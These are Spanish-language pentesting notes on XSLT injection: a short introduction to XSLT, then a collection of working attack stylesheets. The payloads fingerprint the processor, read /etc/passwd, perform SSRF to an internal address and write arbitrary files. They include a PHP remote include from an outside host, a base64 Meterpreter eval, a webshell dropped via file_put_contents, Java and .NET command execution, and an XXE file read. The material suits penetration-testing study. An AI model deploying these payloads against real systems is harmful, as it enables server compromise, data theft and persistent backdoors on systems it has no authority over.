# XSLT INJECTION

## RECURSOS WEB

+ https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html
+ https://bughra.dev/posts/xslt/
+ https://blog.s1rn3tz.ovh/pentest-web/injections/xslt
+ https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5
+ https://github.com/ex-cal1bur/XSLT-Injection_reverse-shell
+ https://www.atlan.digital/lab/xslt-injection-basics.html
+ https://www.hackervice.com/server-side-vulnerabilities/server-side-attacks/xslt-injection?utm_source=chatgpt.com
+ https://techbrunch.github.io/patt-mkdocs/XSLT%20Injection/?utm_source=chatgpt.com
+ https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/

## INFORMACIÓN BÁSICA

- XSLT es un lenguaje de programación (turing complete) pensado para convertir archivos XML en otros formatos, principalmente HTML.
- Existen 3 versiones diferentes, siendo la 1 la más utilizada.
- También existen 3 procesadores principales:
    - Libxslt de Gnome
    - Xalan de Apache
    - Saxon de Saxonica
- Cada uno de estos procesadores tiene features diferentes. Un vector de ataque puede ser explotar una feature concreta.
- Para la explotación de la inyección XSLT es necesario que el archivo XSLT se almacene en el lado del servidor.

## ELEMENTOS XSL

- XSLT se estructura de una manera muy similar a XML, pero con etiquetas XSL. Cada una de estas etiquetas tiene un cometido, estas son:
    - <xsl:template>: Le dice al procesador XSLT que hacer cuando encuentre un cierto nodo.
        - Ej:
        
        ```xml
        <xls:template match=”nombre_nodo”> <!-- Cuando encuentres en nodo xml llamado nombre_nodo -->
        	<!-- Ejecuta lo que haya aquí dento -->
        <xsl:template>
        ```
        
    - <xsl:value-of>: Extrae el valor de un nodo XML.
        - Ej:
        
        ```xml
        <xls:template match=”nombre_nodo”>
        	<h1><xsl:value-of select="nombre"/><h1> <!-- Muestra en un h1 el contenido del nodo llamado nombre -->
        <xsl:template>
        ```
        
    - <xsl:for-each>: Loop sobre los nodos XML.
        - Ej:
        
        ```xml
         <xsl:for-each select="catalogo/producto"> <!-- Para cada elemento de los nodos catalogo/producto -->
                        <div>
                            <h3><xsl:value-of select="nombre"/></h3> <!-- Selecciona nombre, ponlo en un h3 -->
                            <p>Precio: <xsl:value-of select="precio"/> €</p> <!-- Selecciona precio, ponlo en un parrafo -->
                        </div>
         </xsl:for-each>
        ```
        

## ANOTACIONES SOBRE SU ABUSO

El XSLT es un lenguaje completo y muy expresivo. Aunque no tenga CVEs, su flexibilidad permite:

- ejecutar funciones internas del procesador
- acceder a recursos locales
- cargar plantillas externas
- usar namespaces para habilitar extensiones
- transformar nodos en contenido arbitrario

En otras palabras: **no hace falta un exploit si el lenguaje ya es poderoso**.

## EJEMPLO DE USO MEDIANTE SAXON

Tenemos el siguiente XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
    <cd>
        <title>CD Title</title>
        <artist>The artist</artist>
        <company>Da Company</company>
        <price>10000</price>
        <year>1760</year>
    </cd>
</catalog>

```

Y queremos transformarlo a HTML utilizando un XSLT:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>">
<xsl:template match="/">
    <html>
    <body>
    <h2>The Super title</h2>
    <table border="1">
        <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
        </tr>
        <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
        </tr>
    </table>
    </body>
    </html>
</xsl:template>
</xsl:stylesheet>

```

Para ejecutarlo con saxon:

```bash
saxonb-xslt -xsl:nombre_archivo_xslt.xsl nombre_archivo_xml.xml

```html
<html>
   <body>
      <h2>The Super title</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
         </tr>
         <tr>
            <td>CD Title</td>
            <td>The artist</td>
         </tr>
      </table>
   </body>
</html>

```

## EXPLOTACIÓN

- Suponiendo que podamos inyectar el archivo XSLT. Lo primero que deberíamos hacer es enumerar toda la información relativa al procesador posible.
- Dependiendo del tipo de procesador, del lenguaje de programación del backend y del parsing XML que exista, se podrán realizar unas inyecciones u otras. Por eso es importante la enumeración.

**FINGERPRINT**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>

```

Al ejecutar este código nos mostraría la información de versión del XSLT:

```bash
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b><http://www.saxonica.com/><br>

```

**READ LOCAL FILE**

Si lo que queremos es tratar de leer un archivo del sistema:

```xml
<xsl:stylesheet xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" xmlns:abc="<http://php.net/xsl>" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

```

Ejecutamos:

```bash
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

```

**READ LOCAL FILE CON DOCUMENT()**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('/etc/passwd')"/> <!-- Con esto podríamos leer el archivo /etc/passwd -->
  </xsl:template>
</xsl:stylesheet>
```

**SSRF CON DOCUMENT()**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
  </xsl:template>
</xsl:stylesheet>
```

> Un SSRF consiste en hacer que un servidor emita una solicitud a una dirección.
> 

**WRITE FILES MEDIANTE EXTENSIÓN EXSLT**

EXSLT es un conjunto de extensiones de XSLT 1.0. No forman parte del estándar XSLT.

Los procesadores que tienen soporte para EXSLT son:

- Saxon (6,9,10,…)
- libxslt
- Xalan-J y Xalan-C parcialmente

XLST de version 2.0 y 3.0 implemental algunas de las funciones de EXSLT de serie, pero no todas ni de la misma manera. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text"> <!-- Escribimos un txt. Podriamos escribir en otro path mediante ruta absoluta -->
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**REMOTE CODE EXECUTION CON PHP WRAPPER**

**FUNCIÓN readfile**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

**FUNCIÓN scandir**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
```

**EJECUCIÓN REMOTA DE UN ARCHIVO PHP MEDIANTE assert**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

**EJECUCIÓN DE UN METERPRETER PHP UTILIZANDO PHP WRAPPER**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
```

**EJECUCIÓN REMOTA DE ARCHIVO PHP UTILIZANDO file_put_contents**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
```

**REMOTE CODE EXECUTION CON JAVA**

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

**REMOTE CODE EXECUTION CON .NET NATIVO**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
 <xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT --- 
  </xsl:template>
</xsl:stylesheet>
```

**XXE CON XLST**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```
